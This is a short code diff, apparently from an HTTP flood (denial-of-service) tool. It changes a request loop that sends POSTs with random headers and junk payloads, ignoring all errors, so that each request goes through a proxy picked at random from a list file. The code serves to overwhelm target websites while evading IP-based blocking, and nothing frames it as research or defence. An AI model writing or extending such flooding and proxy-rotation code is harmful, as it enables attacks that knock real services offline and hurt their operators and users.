@@ -442,8 +442,14 @@ class Method:
                 headers = random_headers()
                 payload = random_data()
                 try:
-                    self.scraper.post(url, headers=headers, data=payload)
-                    requests.post(url, headers=headers, data=payload)
+                    self.scraper.post(url, headers=headers, data=payload, proxies={
+                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                        })
+                    requests.post(url, headers=headers, data=payload, proxies={
+                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                        })
                 except:
                     pass
 
